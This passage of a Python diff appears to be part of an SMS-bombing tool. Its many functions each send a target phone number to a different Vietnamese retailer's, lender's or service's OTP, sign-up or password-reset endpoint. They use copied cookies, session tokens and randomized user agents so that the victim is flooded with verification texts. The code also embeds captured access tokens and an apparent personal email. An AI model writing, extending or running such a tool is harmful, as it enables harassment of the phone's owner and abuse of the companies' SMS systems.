+        '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
+    }
+
+        headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
+        'Origin': 'https://www.thegioididong.com',
+        'Pragma': 'no-cache',
+        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+        data = {
+        'phoneNumber': phone,
+        'isReSend': 'false',
+        'sendOTPType': '1',
+        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
+    }
+
+        response = requests.post(
+        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+        hoanthanh("THE GIOI DI DONG 2", phone)
+    except:
+        error("THE GIOI DI DONG 2", phone)
+def mocha(phone):
+    headers = {
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Connection': 'keep-alive',
+    'Origin': 'https://www.best-inc.vn',
+    'Referer': 'https://www.best-inc.vn/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'cross-site',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+    'accept': 'application/json',
+    'authorization': 'null',
+    'content-type': 'application/json',
+    'lang-type': 'vi-VN',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'x-auth-type': 'WEB',
+    'x-lan': 'VI',
+    'x-nat': 'vi-VN',
+    'x-timezone-offset': '7',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+    'verificationCodeType': 1,
+}
+
+    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
+    hoanthanh("800best", phone)
+def money(phone):
+    cookies = {
+    'CaptchaCookieKey': '0',
+    'language': 'vi',
+    'UserTypeMarketing': 'L0',
+    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
+    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
+    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
+    '_gid': 'GA1.2.2031038846.1691083804',
+    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
+    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
+    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
+    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
+    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
+    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
+    '_ga': 'GA1.2.149632214.1689613025',
+    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
+}
+
+    headers = {
+    'authority': 'moneyveo.vn',
+    'accept': '*/*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
+    'origin': 'https://moneyveo.vn',
+    'referer': 'https://moneyveo.vn/vi/registernew/',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+    data = {
+    'phoneNumber': phone,
+}
+
+    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)
+    hoanthanh("moneyveo", phone)
+def winmart(phone):
+    headers = {
+    "User-Agent": get_random_user_agent(),
+    'accept': 'application/json',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': 'Bearer undefined',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://winmart.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://winmart.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-api-merchant': 'WCM',
+}
+
+    json_data = {
+    'firstName': 'Taylor Jasmine',
+    'phoneNumber': phone,
+    'masanReferralCode': '',
+    'dobDate': '2005-08-05',
+    'gender': 'Male',
+}
+
+    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data);hoanthanh("winmart", phone)
+def alf(phone):
+    headers = {
+    'authority': 'api.alfrescos.com.vn',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi-VN',
+    'brandcode': 'ALFRESCOS',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'devicecode': 'web',
+    'origin': 'https://alfrescos.com.vn',
+    'pragma': 'no-cache',
+    'referer': 'https://alfrescos.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+}
+
+    params = {
+    'culture': 'vi-VN',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+    'secureHash': 'ebe2ae8a21608e1afa1dbb84e944dc89',
+    'deviceId': '',
+    'sendTime': 1691127801586,
+    'type': 1,
+}
+
+    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data);hoanthanh("alfrescos", phone)
+def phuc(phone):
+    headers = {
+    "User-Agent": get_random_user_agent(), 
+    'accept': 'application/json',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': 'Bearer undefined',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://order.phuclong.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://order.phuclong.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'userName': phone,
+}
+
+    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data)   ;hoanthanh("winmart", phone)
+def emart(phone):
+    cookies = {
+    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
+    'default': 'e6ec14ce933f55f7f1a9bb7355',
+    'language': 'vietn',
+    'currency': 'VND',
+    '_fbp': 'fb.2.1691143292627.1008340188',
+    '_gid': 'GA1.3.332853186.1691143293',
+    '_gat_gtag_UA_117859050_1': '1',
+    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
+    '_ga': 'GA1.1.736434119.1691143293',
+}
+
+    headers = {
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
+    'Origin': 'https://emartmall.com.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+    'X-Requested-With': 'XMLHttpRequest',
+}
+
+    data = {
+    'mobile': phone,
+}
+
+    response = requests.post(
+    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+);hoanthanh("emartmall", phone)
+def hana(phone):
+    cookies = {
+    '_ym_uid': '1690554219913867740',
+    '_ym_d': '1710341879',
+    '_fbp': 'fb.1.1720103209034.327083033864980369',
+    '_gcl_au': '1.1.2098605329.1720103209',
+    '_ga_P2783EHVX2': 'GS1.1.1720103209.1.0.1720103209.60.0.0',
+    '_ga': 'GA1.2.1065309191.1720103210',
+    '_gid': 'GA1.2.543071985.1720103210',
+    '_gat_UA-151110385-1': '1',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'G5FqQUKlNy_Fx9r4kURNmkn6LOo',
+    '_ym_visorc': 'b',
+    '_ym_isad': '2',
+}
+
+    headers = {
+    'accept': 'application/json',
+    'accept-language': 'vi-VN',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json; charset=utf-8',
+    # 'cookie': '_ym_uid=1690554219913867740; _ym_d=1710341879; _fbp=fb.1.1720103209034.327083033864980369; _gcl_au=1.1.2098605329.1720103209; _ga_P2783EHVX2=GS1.1.1720103209.1.0.1720103209.60.0.0; _ga=GA1.2.1065309191.1720103210; _gid=GA1.2.543071985.1720103210; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=G5FqQUKlNy_Fx9r4kURNmkn6LOo; _ym_visorc=b; _ym_isad=2',
+    'origin': 'https://vayvnd.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://vayvnd.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'site-id': '3',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'login': phone,
+    'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3',
+}
+
+    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data);hoanthanh("vayvnd", phone)
+def kingz(phone):
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': '',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'domain': 'kingfoodmart',
+    'origin': 'https://kingfoodmart.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://kingfoodmart.com/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'operationName': 'SendOTP',
+    'variables': {
+        'phone': phone,
+    },
+    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
+}
+
+    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data);hoanthanh("onelife", phone)
+def med(phone):
+    headers = {
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/json;charset=UTF-8',
+    'Origin': 'https://id-v121.medpro.com.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://id-v121.medpro.com.vn/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+    'appid': 'medpro',
+    'cskhtoken': '',
+    'locale': '',
+    'momoid': '',
+    'osid': '',
+    'ostoken': '',
+    'partnerid': 'medpro',
+    'platform': 'pc',
+}
+
+    json_data = {
+    'fullname': 'người dùng medpro',
+    'deviceId': '401387b523eda9fc5998c36541400134',
+    'phone': phone,
+    'type': 'password',
+}
+
+    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data);hoanthanh("medpro", phone)
+def ghn(phone):
+    headers = {
+    'authority': 'online-gateway.ghn.vn',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://sso.ghn.vn',
+    'pragma': 'no-cache',
+    'referer': 'https://sso.ghn.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phone': phone,
+    'type': 'register',
+}
+
+    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data);hoanthanh("ghn", phone)
+ ###
+def shop(phone):
+    cookies = {
+    '_gcl_au': '1.1.1745429184.1691586808',
+    '_fbp': 'fb.1.1691586808676.1451418847',
+    '_ga': 'GA1.2.1936138960.1691586808',
+    '_gid': 'GA1.2.1897491687.1691674994',
+    '_gat_UA-78703708-2': '1',
+    '_ga_P138SCK22P': 'GS1.1.1691674994.3.1.1691675011.43.0.0',
+}
+
+    headers = {
+    'Accept': '*/*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'Cookie': '_gcl_au=1.1.1745429184.1691586808; _fbp=fb.1.1691586808676.1451418847; _ga=GA1.2.1936138960.1691586808; _gid=GA1.2.1897491687.1691674994; _gat_UA-78703708-2=1; _ga_P138SCK22P=GS1.1.1691674994.3.1.1691675011.43.0.0',
+    'Origin': 'https://shopiness.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://shopiness.vn/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+    'X-Requested-With': 'XMLHttpRequest',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    data = {
+    'action': 'verify-registration-info',
+    'phoneNumber': phone,
+    'refCode': '',
+}
+
+    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)  ;hoanthanh("shopiness", phone)
+def gala(phone):
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'vi',
+    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6IjEuNTIuMTc1LjEzNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ',
+    'cache-control': 'no-cache',
+    # 'content-length': '0',
+    'origin': 'https://galaxyplay.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://galaxyplay.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+    params = {
+    'phone': phone,
+}
+
+    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers);hoanthanh("glxplay", phone)
+def ahamove(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://app.ahamove.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://app.ahamove.com/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'mobile': phone,
+    'name': 'khải',
+    'email': 'khaissn@gmail.com',
+    'country_code': 'VN',
+    'firebase_sms_auth': 'true',
+    'time': 1720101304,
+    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
+}
+
+    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data);hoanthanh("ahamove", phone)
+def lon(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'access-control-allow-origin': '*',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'order-channel': '1',
+    'origin': 'https://nhathuoclongchau.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://nhathuoclongchau.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-channel': 'EStore',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+    'otpType': 0,
+    'fromSys': 'WEBKHLC',
+}
+
+    response = requests.post(
+    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
+    headers=headers,
+    json=json_data,
+);hoanthanh("nhathuoclongchau", phone)
+def medi(phone):
+    cookies = {
+    'SERVER': 'nginx3',
+    '_gcl_au': '1.1.2035327165.1720297698',
+    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
